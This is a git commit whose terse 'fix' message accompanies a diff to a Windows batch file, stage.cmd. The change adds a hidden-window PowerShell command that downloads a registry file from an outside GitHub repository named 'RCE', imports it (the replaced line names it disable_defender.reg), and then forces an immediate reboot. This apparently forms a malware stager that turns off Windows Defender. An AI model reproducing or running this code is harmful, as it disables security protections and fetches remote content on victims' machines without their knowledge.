49e42f95fe8b8a95c2ea6c0c7307e057d80795cc
Thông Tấn <ttthong315@gmail.com>
2025-03-28 20:18:30 +0700

    fix

--- stage.cmd
+++ stage.cmd
@@ -1,3 +1,5 @@
 @echo off
-reg import disable_defender.reg
+powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/dis.reg' -OutFile 'dis.reg'"
+
+reg import dis.reg
 shutdown /r /t 0
